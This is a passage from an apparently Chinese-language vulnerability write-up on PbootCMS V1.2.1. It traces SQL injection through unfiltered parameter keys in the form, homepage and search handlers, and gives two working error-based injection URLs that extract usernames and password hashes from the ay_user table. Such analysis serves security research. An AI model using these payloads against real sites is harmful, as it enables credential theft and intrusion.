class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* if ($this-&gt;config(&#39;message_check_code&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* if (! $checkcode) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* alert_back(&#39;</span><span class="cs7FFD2630">验证码不能为空！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* if ($checkcode != session(&#39;checkcode&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* alert_back(&#39;</span><span class="cs7FFD2630">验证码错误！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">读取字段</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $form = $this-&gt;model-&gt;getFormField($fcode)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">接收表单不存在任何字段，请核对后重试！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">接收数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($form as $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$field_data = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($field_data)) { // </span><span class="cs7FFD2630">如果是多选等情况时转换</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$field_data = implode(&#39;,&#39;, $field_data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($value-&gt;required &amp;&amp; ! $field_data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back($value-&gt;description . &#39;</span><span class="cs7FFD2630">不能为空！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[$value-&gt;name] = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= $value-&gt;description . &#39;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置创建时间</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;create_time&#39;] = get_datetime();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">写入数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;model-&gt;addForm($value-&gt;table_name, $data)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;session(&#39;lastsub&#39;, time()); // </span><span class="cs7FFD2630">记录最后提交时间</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;</span><span class="cs7FFD2630">提交表单数据成功！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_subject = &quot;</span><span class="cs7FFD2630">【</span><span class="cs9FB05234">PbootCMS</span><span class="cs7FFD2630">】您有新的表单数据，请注意查收！</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= &#39;&lt;br&gt;</span><span class="cs7FFD2630">来自网站</span><span class="cs9FB05234">&#39; . get_http_url() . &#39;</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_location(&#39;</span><span class="cs7FFD2630">提交成功！</span><span class="cs9FB05234">&#39;, &#39;-1&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;</span><span class="cs7FFD2630">提交表单数据失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">提交失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error(&#39;</span><span class="cs7FFD2630">提交失败，请使用</span><span class="cs9FB05234">POST</span><span class="cs7FFD2630">方式提交！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">内容，只匹配数据库的字段，相同才会拼接到</span><span class="cs8926E06"> $_data</span><span class="cs9C1B1871">数组</span></p><p class="cs3A447A38"><span class="cs7FFD2630">然后就会带入</span><span class="cs9FB05234"> $this-&gt;model-&gt;addForm($value-&gt;table_name, $data) </span><span class="cs7FFD2630">执行语句</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\home\model\ParserModel.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function addForm($table, $data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return parent::table($table)-&gt;insert($data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">6.0</span><span class="cs9C1B1871">可以看到带入了进入了</span><span class="cs8926E06"> insert </span><span class="cs9C1B1871">那么我们传的二维数组刚好可以控制</span><span class="cs8926E06">key </span><span class="cs9C1B1871">带入数据库查询引发注入</span><span class="cs8926E06">.</span></p><h2 class="cs868C439D">
			<a name="X0ba617b112d6e2f90fc402c1807760407e10841"><span class="csB2D98684">0X01.3 </span><span class="cs83F14626">前台首页注入</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">0x08.3.1 </span><span class="cs9C1B1871">漏洞演示</span><span class="cs8926E06"> url:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image8.png" width="560" height="184" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X912bdc313bbae4b1b0501c4b9708dadb995d1bd"><span class="csD1E291E2">0x01.3.2 </span><span class="csD6CA00D2">漏洞解读</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件地址：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\home\controller\ParserController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">index(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">首页</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">骚操作</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">注入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// parserAfter -&gt; parserSpecifyListLabel</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function index()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = parent::parser(&#39;index.html&#39;); // </span><span class="cs7FFD2630">框架标签解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserBefore($content); // CMS</span><span class="cs7FFD2630">公共标签前置解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserPositionLabel($content, - 1, &#39;</span><span class="cs7FFD2630">首页</span><span class="cs9FB05234">&#39;, SITE_DIR . &#39;/&#39;); // CMS</span><span class="cs7FFD2630">当前位置标签解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserSpecialPageSortLabel($content, 0, &#39;&#39;, SITE_DIR . &#39;/&#39;); // </span><span class="cs7FFD2630">解析分类标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserAfter($content); // CMS</span><span class="cs7FFD2630">公共标签后置解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;cache($content, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件地址：</span><span class="cs8926E06">apps\home\controller\ParserController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">parserAfter()</span></p><p class="cs3A447A38"><span class="cs7FFD2630">跟进</span><span class="cs9FB05234"> $content = $this-&gt;parser-&gt;parserAfter($content); </span><span class="cs7FFD2630">这个方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">解析全局后置公共标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function parserAfter($content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parserSpecifyListLabel($content); // </span><span class="cs7FFD2630">指定列表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $content;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">方法：</span><span class="cs8926E06">parserSpecifyListLabel(</span></p><p class="cs3A447A38"><span class="cs7FFD2630">进入以后</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">查看调用了</span><span class="cs9FB05234"> $content = $this-&gt;parserSpecifyListLabel($content); </span><span class="cs7FFD2630">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">解析指定分类列表标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function parserSpecifyListLabel($content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// </span><span class="cs7FFD2630">数据筛选</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">骚操作注入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;$where2 = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;foreach ($_GET as $key =&gt; $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (substr($key, 0, 4) == &#39;ext_&#39;) { // </span><span class="cs7FFD2630">其他字段不加入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$where2[$key] = get($key);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// </span><span class="cs7FFD2630">读取数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if ($page) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这里接收了外部了外部所有的</span><span class="cs8926E06">get</span><span class="cs9C1B1871">参数然后判断了开头的前</span><span class="cs8926E06">4</span><span class="cs9C1B1871">个字符是否</span><span class="cs8926E06"> ext_ </span><span class="cs9C1B1871">开头，如果符合就直接拼接进入</span><span class="cs8926E06">$where2</span><span class="cs9C1B1871">这个数组</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后带入数据库进行</span><span class="cs8926E06">getList</span><span class="cs9C1B1871">方法与</span><span class="cs8926E06">getSpecifyList</span><span class="cs9C1B1871">查询，而底层是字符串拼接，过滤了</span><span class="cs8926E06">value</span><span class="cs9C1B1871">没有过滤</span><span class="cs8926E06">key</span><span class="cs9C1B1871">所以有注入</span></p><h2 class="cs868C439D">
			<a name="X7e0aa7b5d1c8b1928e240193034b08daa9e0459"><span class="csB2D98684">0x08.4 </span><span class="cs83F14626">前台搜索框注入</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X699e79ce5fb2adfc72a6dfb225c31a5bf530ea2"><span class="csD1E291E2">0x08.4.1 </span><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&amp;updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image9.png" width="560" height="160" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xa9a9120306ff3f7b45421fb9c6cb28221c8c04e"><span class="csD1E291E2">0x08.4.2 </span><span class="csD6CA00D2">漏洞讲解</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">文件地址：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\home\controller\SearchController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">index()</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">骚操作</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">注入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// parserSearchLabel</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function index()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = parent::parser(&#39;search.html&#39;); // </span><span class="cs7FFD2630">框架标签解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserBefore($content); // CMS</span><span class="cs7FFD2630">公共标签前置解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserPositionLabel($content, 0, &#39;</span><span class="cs7FFD2630">搜索</span><span class="cs9FB05234">&#39;, url(&#39;/home/Search/index&#39;)); // CMS</span><span class="cs7FFD2630">当前位置标签解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserSpecialPageSortLabel($content, 0, &#39;</span><span class="cs7FFD2630">搜索结果</span><span class="cs9FB05234">&#39;, url(&#39;/home/Search/index&#39;)); // </span><span class="cs7FFD2630">解析分类标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserSearchLabel($content); // </span><span class="cs7FFD2630">搜索结果标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = $this-&gt;parser-&gt;parserAfter($content); // CMS</span><span class="cs7FFD2630">公共标签后置解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;cache($content, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件地址：</span><span class="cs8926E06">apps\home\controller\ParserController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">parserSearchLabel(</span></p><p class="cs3A447A38"><span class="cs7FFD2630">进入以后</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">查看调用了</span><span class="cs9FB05234"> $content = $this-&gt;parser-&gt;parserSearchLabel($content); &nbsp;</span><span class="cs7FFD2630">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">解析内容搜索结果标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function parserSearchLabel($content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;foreach ($_GET as $key =&gt; $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (! ! $value = get($key, &#39;vars&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$where2[$key] = $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;// </span><span class="cs7FFD2630">读取数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (! $data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2, $fuzzy)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$content = str_replace($matches[0][$i], &#39;&#39;, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里就将重要的方法分析一下了，其他无关的就删除掉避免影响阅读。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这里接收了外部了外部所有的</span><span class="cs8926E06">get</span><span class="cs9C1B1871">参数然后就直接拼接进入</span><span class="cs8926E06">$where2</span><span class="cs9C1B1871">这个数组</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后带入数据库进行</span><span class="cs8926E06">getList</span><span class="cs9C1B1871">方法查询，而底层是字符串拼接，过滤了</span><span class="cs8926E06">value</span><span class="cs9C1B1871">没有过滤</span><span class="cs8926E06">key</span><span class="cs9C1B1871">所以有注入</span></p><h2 class="cs868C439D">
